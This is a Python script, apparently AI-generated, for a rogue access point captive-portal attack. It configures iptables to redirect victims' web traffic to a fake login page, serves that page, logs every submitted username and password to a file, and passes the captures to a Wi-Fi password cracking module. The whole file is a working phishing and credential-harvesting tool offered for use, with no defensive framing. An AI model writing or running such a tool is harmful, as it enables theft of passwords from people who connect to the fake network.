# ChatGPT wrote this

import os
import shutil
import subprocess
import time
from colorama import Fore, init

init(autoreset=True)

interface_name = None

def ensure_tmp_dir():
    tmp_dir = "./tmp"
    os.makedirs(tmp_dir, exist_ok=True)
    return tmp_dir

def find_interface_in_hostapd():
    global interface_name
    try:
        with open("hostapd.conf", "r") as f:
            for line in f:
                if line.strip().startswith("interface="):
                    interface_name = line.strip().split("=", 1)[1]
                    break
    except FileNotFoundError:
        print(Fore.RED + "hostapd.conf file not found.")

def list_html_files(directory="./Captive_Portals"):
    try:
        files = [f for f in os.listdir(directory) if f.endswith(".html")]
        if not files:
            print(Fore.RED + f"No HTML files found in {directory}")
            return []
        print(Fore.CYAN + "\nAvailable Captive Portal HTML files:")
        for idx, file in enumerate(files, 1):
            print(f"  {idx}. {file}")
        return files
    except FileNotFoundError:
        print(Fore.RED + f"Directory {directory} does not exist.")
        return []

def choose_html_file(files):
    while True:
        choice = input(Fore.GREEN + "Choose a captive portal HTML file by number: ")
        if choice.isdigit() and 1 <= int(choice) <= len(files):
            return files[int(choice) - 1]
        print(Fore.RED + "Invalid selection. Please enter a valid number.")

def enable_ip_forwarding():
    print(Fore.YELLOW + "[*] Enabling IP Forwarding")
    os.system("sudo sysctl -w net.ipv4.ip_forward=1")

def setup_iptables_redirection(in_interface):
    print(Fore.YELLOW + "[*] Configuring iptables for captive portal redirection")
    os.system(f"sudo iptables -t nat -A PREROUTING -i {in_interface} -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:8080")

def write_server_script(directory):
    tmp_dir = ensure_tmp_dir()
    script_path = os.path.join(tmp_dir, "server_script.py")

    script_content = f"""\
import http.server
import socketserver
import urllib.parse
from colorama import Fore, init
init(autoreset=True)
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
import Compare_pass


class CaptiveHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(length).decode('utf-8')
        params = urllib.parse.parse_qs(post_data)
        username = params.get('username', [''])[0]
        password = params.get('password', [''])[0]

        with open("./../credentials.txt", "a") as f:
            f.write(f"Username: {{username}} | Password: {{password}}\\n")

        print(Fore.MAGENTA + '\\n[+] Captured Credentials:')
        print(Fore.CYAN + f"  -> Username: {{username}}")
        print(Fore.CYAN + f"  -> Password: {{password}}")

        try:
            from Compare_pass import main as crack_main
            result = crack_main()
            if result:
                ssid, pw = result
                print(Fore.GREEN + f"\\n[Returned] SSID: {{ssid}}, Password: {{pw}}")
            else:
                print(Fore.RED + "\\n[Returned] No valid credentials found or handshake failed.")
        except Exception as e:
            print(Fore.RED + f"[!] Error running cracking script: {{e}}")

        self.send_response(302)
        self.send_header('Location', '/')
        self.end_headers()

if __name__ == '__main__':
    import os
    os.chdir(r"{directory}")
    with socketserver.TCPServer(('0.0.0.0', 8080), CaptiveHandler) as httpd:
        print(Fore.GREEN + "Serving captive portal on http://10.0.0.1:8080")
        httpd.serve_forever()
"""

    with open(script_path, "w") as f:
        f.write(script_content)

    return script_path

def launch_captive_portal():
    os.remove("./tmp/server_script.py")
    time.sleep(.5)
    find_interface_in_hostapd()
    if not interface_name:
        print(Fore.RED + "[!] Error: interface_name not set in hostapd.conf or not found.")
        return

    html_files = list_html_files()
    if not html_files:
        return

    selected_file = choose_html_file(html_files)
    selected_path = os.path.join("Captive_Portals", selected_file)

    shutil.copyfile(selected_path, "./Captive_Portals/index.html")

    enable_ip_forwarding()
    setup_iptables_redirection(interface_name)

    server_script = write_server_script("./Captive_Portals")

    try:
        subprocess.Popen(["xterm", "-hold", "-e", "python3", server_script])
        print(Fore.GREEN + "[*] Captive portal server running inside xterm popup.")
    except Exception as e:
        print(Fore.RED + f"[!] Failed to launch xterm server: {{e}}")

if __name__ == "__main__":
    launch_captive_portal()
